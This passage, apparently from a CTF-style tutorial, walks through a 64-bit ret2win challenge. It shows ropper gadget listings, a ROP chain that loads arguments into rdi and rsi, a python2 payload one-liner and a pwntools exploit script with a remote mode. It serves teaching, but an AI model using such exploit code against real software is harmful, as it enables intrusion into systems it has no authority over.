0x00000000004011e6: add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret; 
0x00000000004010ae: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x10c0; mov edi, 0x404040; jmp rax; 
0x00000000004010f0: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x1100; mov edi, 0x404040; jmp rax; 
0x0000000000401185: add byte ptr [rax], al; call 0x1030; nop; nop; leave; ret; 
0x00000000004011cd: add byte ptr [rax], al; call 0x1040; nop; leave; ret; 
0x00000000004011de: add byte ptr [rax], al; call 0x1190; mov eax, 0; pop rbp; ret; 
0x00000000004011c8: add byte ptr [rax], al; mov eax, 0; call 0x1040; nop; leave; ret; 
0x00000000004011e8: add byte ptr [rax], al; pop rbp; ret; 
0x0000000000401252: add byte ptr [rax], al; sub rsp, 8; add rsp, 8; ret; 
0x0000000000401009: add byte ptr [rax], al; test rax, rax; je 0x1012; call rax; 
0x0000000000401009: add byte ptr [rax], al; test rax, rax; je 0x1012; call rax; add rsp, 8; ret; 
0x00000000004010b0: add byte ptr [rax], al; test rax, rax; je 0x10c0; mov edi, 0x404040; jmp rax; 
0x00000000004010f2: add byte ptr [rax], al; test rax, rax; je 0x1100; mov edi, 0x404040; jmp rax; 
0x0000000000401088: add byte ptr [rax], al; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040108e: add byte ptr [rax], al; ret; 
0x00000000004011c9: add byte ptr [rax], bh; call 0x1040; nop; leave; ret; 
0x000000000040108d: add byte ptr [rax], r8b; ret; 
0x0000000000401127: add byte ptr [rcx], al; pop rbp; ret; 
0x0000000000401082: add dil, dil; adc eax, 0x2f66; hlt; nop dword ptr [rax + rax]; ret; 
0x0000000000401006: add eax, 0x2fed; test rax, rax; je 0x1012; call rax; 
0x0000000000401006: add eax, 0x2fed; test rax, rax; je 0x1012; call rax; add rsp, 8; ret; 
0x0000000000401013: add esp, 8; ret; 
0x0000000000401012: add rsp, 8; ret; 
0x0000000000401187: call 0x1030; nop; nop; leave; ret; 
0x00000000004011cf: call 0x1040; nop; leave; ret; 
0x000000000040111d: call 0x10a0; mov byte ptr [rip + 0x2f17], 1; pop rbp; ret; 
0x00000000004011e0: call 0x1190; mov eax, 0; pop rbp; ret; 
0x0000000000401084: call qword ptr [rip + 0x2f66]; hlt; nop dword ptr [rax + rax]; ret; 
0x0000000000401010: call rax; 
0x0000000000401010: call rax; add rsp, 8; ret; 
0x0000000000401182: cmp eax, 0xec1; call 0x1030; nop; nop; leave; ret; 
0x0000000000401234: fisttp word ptr [rax - 0x7d]; ret; 
0x0000000000401002: in al, dx; or byte ptr [rax - 0x75], cl; add eax, 0x2fed; test rax, rax; je 0x1012; call rax; 
0x000000000040100e: je 0x1012; call rax; 
0x000000000040100e: je 0x1012; call rax; add rsp, 8; ret; 
0x00000000004010ab: je 0x10c0; mov eax, 0; test rax, rax; je 0x10c0; mov edi, 0x404040; jmp rax; 
0x00000000004010b5: je 0x10c0; mov edi, 0x404040; jmp rax; 
0x00000000004010ed: je 0x1100; mov eax, 0; test rax, rax; je 0x1100; mov edi, 0x404040; jmp rax; 
0x00000000004010f7: je 0x1100; mov edi, 0x404040; jmp rax; 
0x00000000004010bc: jmp rax; 
0x0000000000401181: lea edi, [rip + 0xec1]; call 0x1030; nop; nop; leave; ret; 
0x0000000000401180: lea rdi, [rip + 0xec1]; call 0x1030; nop; nop; leave; ret; 
0x0000000000401079: lock adc dword ptr [rax], eax; mov rdi, 0x4011d7; call qword ptr [rip + 0x2f66]; hlt; nop dword ptr [rax + rax]; ret; 
0x0000000000401122: mov byte ptr [rip + 0x2f17], 1; pop rbp; ret; 
0x00000000004011ca: mov eax, 0; call 0x1040; nop; leave; ret; 
0x00000000004011db: mov eax, 0; call 0x1190; mov eax, 0; pop rbp; ret; 
0x00000000004011e5: mov eax, 0; pop rbp; ret; 
0x00000000004010ad: mov eax, 0; test rax, rax; je 0x10c0; mov edi, 0x404040; jmp rax; 
0x00000000004010ef: mov eax, 0; test rax, rax; je 0x1100; mov edi, 0x404040; jmp rax; 
0x0000000000401005: mov eax, dword ptr [rip + 0x2fed]; test rax, rax; je 0x1012; call rax; 
0x0000000000401005: mov eax, dword ptr [rip + 0x2fed]; test rax, rax; je 0x1012; call rax; add rsp, 8; ret; 
0x000000000040111b: mov ebp, esp; call 0x10a0; mov byte ptr [rip + 0x2f17], 1; pop rbp; ret; 
0x0000000000401077: mov ecx, 0x4011f0; mov rdi, 0x4011d7; call qword ptr [rip + 0x2f66]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040107e: mov edi, 0x4011d7; call qword ptr [rip + 0x2f66]; hlt; nop dword ptr [rax + rax]; ret; 
0x00000000004010b7: mov edi, 0x404040; jmp rax; 
0x0000000000401004: mov rax, qword ptr [rip + 0x2fed]; test rax, rax; je 0x1012; call rax; 
0x0000000000401004: mov rax, qword ptr [rip + 0x2fed]; test rax, rax; je 0x1012; call rax; add rsp, 8; ret; 
0x000000000040111a: mov rbp, rsp; call 0x10a0; mov byte ptr [rip + 0x2f17], 1; pop rbp; ret; 
0x0000000000401076: mov rcx, 0x4011f0; mov rdi, 0x4011d7; call qword ptr [rip + 0x2f66]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040107d: mov rdi, 0x4011d7; call qword ptr [rip + 0x2f66]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040108b: nop dword ptr [rax + rax]; ret; 
0x000000000040124d: nop dword ptr [rax]; ret; 
0x0000000000401003: or byte ptr [rax - 0x75], cl; add eax, 0x2fed; test rax, rax; je 0x1012; call rax; 
0x00000000004010b6: or dword ptr [rdi + 0x404040], edi; jmp rax; 
0x0000000000401244: pop r12; pop r13; pop r14; pop r15; ret; 
0x0000000000401246: pop r13; pop r14; pop r15; ret; 
0x0000000000401248: pop r14; pop r15; ret; 
0x000000000040124a: pop r15; ret; 
0x0000000000401243: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x0000000000401247: pop rbp; pop r14; pop r15; ret; 
0x0000000000401129: pop rbp; ret; 
0x000000000040124b: pop rdi; ret; 
0x0000000000401249: pop rsi; pop r15; ret; 
0x0000000000401245: pop rsp; pop r13; pop r14; pop r15; ret; 
0x0000000000401119: push rbp; mov rbp, rsp; call 0x10a0; mov byte ptr [rip + 0x2f17], 1; pop rbp; ret; 
0x000000000040100d: sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; 
0x0000000000401255: sub esp, 8; add rsp, 8; ret; 
0x0000000000401001: sub esp, 8; mov rax, qword ptr [rip + 0x2fed]; test rax, rax; je 0x1012; call rax; 
0x0000000000401254: sub rsp, 8; add rsp, 8; ret; 
0x0000000000401000: sub rsp, 8; mov rax, qword ptr [rip + 0x2fed]; test rax, rax; je 0x1012; call rax; 
0x000000000040100c: test eax, eax; je 0x1012; call rax; 
0x000000000040100c: test eax, eax; je 0x1012; call rax; add rsp, 8; ret; 
0x00000000004010b3: test eax, eax; je 0x10c0; mov edi, 0x404040; jmp rax; 
0x00000000004010f5: test eax, eax; je 0x1100; mov edi, 0x404040; jmp rax; 
0x000000000040100b: test rax, rax; je 0x1012; call rax; 
0x000000000040100b: test rax, rax; je 0x1012; call rax; add rsp, 8; ret; 
0x00000000004010b2: test rax, rax; je 0x10c0; mov edi, 0x404040; jmp rax; 
0x00000000004010f4: test rax, rax; je 0x1100; mov edi, 0x404040; jmp rax; 
0x000000000040108a: hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040118e: leave; ret; 
0x000000000040118d: nop; leave; ret; 
0x000000000040118c: nop; nop; leave; ret; 
0x00000000004010bf: nop; ret; 
0x0000000000401016: ret; 
0x0000000000401080: xlatb; adc dword ptr [rax], eax; call qword ptr [rip + 0x2f66]; hlt; nop dword ptr [rax + rax]; ret; 

105 gadgets found
```
These are all the gadgets in the existing binary that will allow us to modify registers and their values. We are specifically looking for a gadget that will allow us to pop values into ```$rdi``` and ```$rsi```. Luckily, we can search for those

``` Bash
$ ropper --file ret2win_params --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ret2win_params
0x000000000040124b: pop rdi; ret;
```
We were given an address for the instruction to pop values into ```$rdi```. We can call this address, then the next value that we enter will be popped into ```$rdi```. We can do the same with ```$rsi```

``` Bash
$ ropper --file ret2win_params --search "pop rsi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rsi

[INFO] File: ret2win_params
0x0000000000401249: pop rsi; pop r15; ret;
```
Here, we also find an address for the ```pop $rsi``` function. However, it is important to note that this instruction also pops a value into ```$r15``` as well. This means we will have to add a value for both ```$rsi``` AND ```$r15```. With this information, we can build out our payload structure

``` Bash
Padding * 24
Hacked Function Address 0x0000000000401142
Pop rdi function 0x000000000040124b
rdi value 0xdeadbeefdeadbeef
pop rsi r15 function 0x0000000000401249
rsi value 0xc0debabec0debabe
junk r15 value 0x0000000000000000
```
This seems like it would work and follows a relatively similar structure to 32-bit binaries. However, this will not work. It will direct execution to the ```hacked()``` function but since the parameters are being pulled onto the stack from registers, those registers need to be filled BEFORE the function is called otherwise they will contain different values.
This means that we need to simply rearrange the order of our addresses and values so that the register info comes first and the function address comes last. This should look like

``` Bash
Padding * 24
Pop rdi function 0x000000000040124b
rdi value 0xdeadbeefdeadbeef
pop rsi r15 function 0x0000000000401249
rsi value 0xc0debabec0debabe
junk r15 value 0x0000000000000000
Hacked Function Address 0x0000000000401142
```
We can now construct this into our python script to generate a payload

``` Python
python2 -c 'print "a" * 24 + "\x4b\x12\x40\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\x49\x12\x40\x00\x00\x00\x00\x00" + "\xbe\xba\xde\xc0\xbe\xba\xde\xc0" + "\x00\x00\x00\x00\x00\x00\x00\x00" + "\x42\x11\x40\x00\x00\x00\x00\x00"' > myPayload
```
Now, if we run the binary with this new payload we get

``` Bash
$ ./ret2win_params < myPayload
Name:
Hi there, aaaaaaaaaaaaaaaaaaaaaaaaK@
This function is TOP SECRET! How did you get in here?! :O
zsh: segmentation fault  ./ret2win_params < myPayload3
```
We did it! This version was a lot more complex than the 32-bit version but it still follows a very similar attack path. The good news is that we can write a python script to do this for us!

## Python Script

This will look very similar to the one shown in the last level, but I will explain any important differences. First, we will see in the top part of the script in the ```find_ip()``` function, that the lines should correspond to whether you are running it in 32 or 64 bit.

``` Python
from pwn import *


# Allows easy swapping betwen local/remote/debug modes
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # (python script_name REMOTE ip port)
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# This is for finding the offset automatically, does not work if the binary is owned by root and youre not root
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b':', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  #32-bit
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  #64-bit
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './ret2win_params'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# 64 Bit Version
io = start()

offset = find_ip(cyclic(200))

rdi = 0x000000000040124b

rsi_r15 = 0x0000000000401249

payload = flat ({
    offset: [
        rdi,
        0xdeadbeefdeadbeef,
        rsi_r15,
        0xc0debabec0debabe,
        0x0,
        elf.functions.hacked
    ]
})

write("payload", payload)

io.sendlineafter(b':', payload)

io.interactive()

# 32 Bit Version

#offset = find_ip(cyclic(200))

# io = start()

# payload = flat ({
#     offset: [
#         elf.functions.hacked,
#         0x0,
#         0xdeadbeef,
#         0xc0debabe
#     ]
# })

# write('payload', payload)

# io.sendlineafter(b':', payload)

# io.interactive()
```
We can see that the biggest difference is our actual payload. Remember that 32-bit pulls values for function parameters right off the stack, while 64-bit pops then into registers, then from registers onto the stack. That is the only difference between the two.

Every payload will be different for every binary but you can see that other than that, these two examples are extremely similar.
